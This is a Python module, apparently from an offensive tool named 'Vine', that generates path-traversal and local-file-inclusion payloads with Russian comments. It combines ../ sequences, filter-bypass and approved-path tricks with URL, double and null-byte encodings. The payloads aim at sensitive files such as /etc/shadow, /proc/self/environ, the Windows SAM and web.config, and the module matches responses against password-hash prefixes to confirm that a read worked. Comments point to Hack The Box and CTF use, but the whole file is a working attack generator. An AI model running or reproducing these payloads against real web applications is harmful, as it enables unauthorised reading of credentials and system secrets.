"""
Vine · core/payloads.py
Генератор traversal-payloads и кодировок.
"""

import urllib.parse
from dataclasses import dataclass


# ── Целевые файлы ────────────────────────────────────────────────────────────

TARGET_FILES: dict[str, list[str]] = {
    "linux": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/os-release",
        "/proc/self/environ",
        "/proc/version",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/usr/share/flags/flag.txt",   # HTB
        "/root/flag.txt",               # CTF
        "/home/user/flag.txt",          # CTF
    ],
    "windows": [
        "C:\\Windows\\boot.ini",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\repair\\sam",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\xampp\\apache\\conf\\httpd.conf",
    ],
}

# ── Паттерны подтверждения ───────────────────────────────────────────────────

SUCCESS_PATTERNS: dict[str, list[str]] = {
    "/etc/passwd":              ["root:x:0:0", "root:!:", "/bin/bash", "/bin/sh", "daemon:"],
    "/etc/shadow":              ["root:", "$6$", "$1$", "$y$", "$2b$"],
    "/etc/hosts":               ["127.0.0.1", "localhost", "::1"],
    "/etc/hostname":            [],
    "/etc/issue":               ["Ubuntu", "Debian", "Linux", "CentOS"],
    "/etc/os-release":          ["NAME=", "VERSION=", "ID="],
    "/proc/self/environ":       ["PATH=", "HOME=", "USER=", "SHELL="],
    "/proc/version":            ["Linux version", "gcc"],
    "/proc/self/cmdline":       ["php", "apache", "nginx", "python"],
    "access.log":               ["GET /", "POST /", "HTTP/1"],
    "error.log":                ["error", "warn", "notice"],
    "auth.log":                 ["sshd", "sudo", "pam"],
    "boot.ini":                 ["[boot loader]", "multi(0)", "rdisk"],
    "win.ini":                  ["[fonts]", "[extensions]", "[mci"],
    "hosts":                    ["127.0.0.1", "localhost"],
    "web.config":               ["<configuration>", "connectionString"],
    "httpd.conf":               ["ServerRoot", "DocumentRoot", "Listen"],
    "flag.txt":                 ["HTB{", "flag{", "FLAG{", "ctf{"],
    "flag":                     ["HTB{", "flag{", "FLAG{"],
}


def get_patterns(target_file: str) -> list[str]:
    for key, patterns in SUCCESS_PATTERNS.items():
        if key in target_file:
            return patterns
    return []


# ── Генераторы traversal ─────────────────────────────────────────────────────

@dataclass(frozen=True)
class Payload:
    raw: str          # оригинал до кодировки
    encoded: str      # итоговая строка для запроса
    encoding: str     # plain / url_encoded / double_encoded / null_byte / null_byte_php
    target_file: str
    technique: str    # plain_traversal / filter_bypass / prefix_bypass / approved_path


def _plain_traversals(target_file: str, depth: int) -> list[tuple[str, str]]:
    """Возвращает список (raw, technique)."""
    results = []
    separators = [
        ("../",    "plain_traversal"),
        ("..\\",   "plain_traversal"),
        ("....//", "filter_bypass"),
        ("....\\\\","filter_bypass"),
        ("..././", "filter_bypass"),
        ("..../",   "filter_bypass"),  # \./ variant
    ]
    for sep, tech in separators:
        for d in range(1, depth + 1):
            t = sep * d
            results.append((f"{t}{target_file}", tech))
            results.append((f"/{t}{target_file}", "prefix_bypass"))

    # approved path bypass
    approved_prefixes = [
        "./languages/", "./lang/", "./templates/", "./pages/",
        "./include/", "./inc/", "./views/", "./files/",
    ]
    for prefix in approved_prefixes:
        for d in range(2, min(depth, 6) + 1):
            raw = f"{prefix}{'../' * d}{target_file}"
            results.append((raw, "approved_path"))

    return results


def _apply_encoding(raw: str, enc: str) -> str:
    if enc == "plain":
        return raw
    if enc == "url_encoded":
        return urllib.parse.quote(raw, safe="")
    if enc == "double_encoded":
        return urllib.parse.quote(urllib.parse.quote(raw, safe=""), safe="")
    if enc == "null_byte":
        return raw + "%00"
    if enc == "null_byte_php":
        return raw + "%00.php"
    return raw


def generate_payloads(
    target_files: list[str],
    depth: int = 8,
    encodings: list[str] | None = None,
) -> list[Payload]:
    """Генерирует все комбинации traversal × encoding × target_file."""
    if encodings is None:
        encodings = ["plain"]

    results: list[Payload] = []
    seen: set[str] = set()

    for tf in target_files:
        for raw, technique in _plain_traversals(tf, depth):
            for enc in encodings:
                encoded = _apply_encoding(raw, enc)
                key = f"{tf}|{encoded}"
                if key in seen:
                    continue
                seen.add(key)
                results.append(Payload(
                    raw=raw,
                    encoded=encoded,
                    encoding=enc,
                    target_file=tf,
                    technique=technique,
                ))

    return results


# ── Quick Scan ──────────────────────────────────────────────────────────────
# Топ-файлы — максимальный шанс найти LFI за минимум запросов

QUICK_TARGET_FILES = {
    "linux": [
        "/etc/passwd",       # root:x:0:0 — стопроцентный индикатор
        "/etc/hosts",        # 127.0.0.1  — почти всегда есть
        "/proc/version",     # Linux version
        "/etc/os-release",   # NAME=
        "/usr/share/flags/flag.txt",  # HTB
        "/root/flag.txt",
    ],
    "windows": [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ],
}

# Топ-payloads для быстрой проверки:
# Глубины 2-5, только ../  и ....// , без кодировок
QUICK_TRAVERSALS = [
    ("../../",          "plain_traversal"),
    ("../../../",       "plain_traversal"),
    ("../../../../",    "plain_traversal"),
    ("../../../../../", "plain_traversal"),
    # prefix bypass
    ("/../../",         "prefix_bypass"),
    ("/../../../",      "prefix_bypass"),
    ("/../../../../",   "prefix_bypass"),
    # filter bypass
    ("....//....//",           "filter_bypass"),
    ("....//....//....//",     "filter_bypass"),
    ("....//....//....//....//","filter_bypass"),
    # approved path
    ("./languages/../../../../",    "approved_path"),
    ("./pages/../../../../",        "approved_path"),
    ("./inc/../../../../",          "approved_path"),
]


def generate_quick_payloads(os_type: str = "linux") -> list[Payload]:
    """
    ~100 payloads для быстрой проверки за 5-15 секунд.
    Покрывает самые распространённые случаи LFI на HTB.
    """
    targets = QUICK_TARGET_FILES.get(os_type, QUICK_TARGET_FILES["linux"])
    results: list[Payload] = []
    seen: set[str] = set()

    for tf in targets:
        for traversal, technique in QUICK_TRAVERSALS:
            for raw in (traversal + tf, "/" + traversal + tf):
                key = f"{tf}|{raw}"
                if key in seen:
                    continue
                seen.add(key)
                results.append(Payload(
                    raw=raw,
                    encoded=raw,
                    encoding="plain",
                    target_file=tf,
                    technique=technique,
                ))

    return results


ENCODING_LABELS = {
    "plain":          "plain traversal",
    "url_encoded":    "URL encoded (%2e%2e%2f)",
    "double_encoded": "double encoded (%252e%252e%252f)",
    "null_byte":      "null byte (%00)",
    "null_byte_php":  "null byte + .php (%00.php)",
}

TECHNIQUE_LABELS = {
    "plain_traversal": "базовый path traversal",
    "filter_bypass":   "bypass нерекурсивного фильтра (....//)",
    "prefix_bypass":   "bypass prefix (/ перед payload)",
    "approved_path":   "bypass approved path (./languages/...)",
}

# ── Wordlist Import ───────────────────────────────────────────────────────────

def load_wordlist(filepath: str) -> list[Payload]:
    """
    Загружает кастомный список путей из файла.

    Поддерживаемые форматы:
      - Один путь на строку: /etc/passwd
      - С комментариями: # это комментарий
      - SecLists формат: просто пути
      - Пустые строки игнорируются

    Возвращает список Payload с technique="wordlist".
    """
    from pathlib import Path

    filepath = str(filepath).strip()
    p = Path(filepath)

    if not p.exists():
        raise FileNotFoundError(f"Wordlist not found: {filepath}")
    if not p.is_file():
        raise ValueError(f"Not a file: {filepath}")

    results: list[Payload] = []
    seen: set[str] = set()
    skipped = 0

    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()

        # Пропускаем пустые строки и комментарии
        if not line or line.startswith("#") or line.startswith("//"):
            continue

        # Нормализуем путь
        if not line.startswith("/"):
            line = "/" + line

        if line in seen:
            skipped += 1
            continue
        seen.add(line)

        results.append(Payload(
            raw=line,
            encoded=line,
            encoding="plain",
            target_file=line,
            technique="wordlist",
        ))

    return results


def wordlist_info(filepath: str) -> dict:
    """Возвращает информацию о wordlist без полной загрузки."""
    from pathlib import Path
    p = Path(filepath)
    if not p.exists():
        return {"error": "file not found"}

    lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
    valid = [l.strip() for l in lines
             if l.strip() and not l.strip().startswith("#")]
    return {
        "path": str(p),
        "size_bytes": p.stat().st_size,
        "total_lines": len(lines),
        "valid_paths": len(valid),
        "preview": valid[:5],
    }
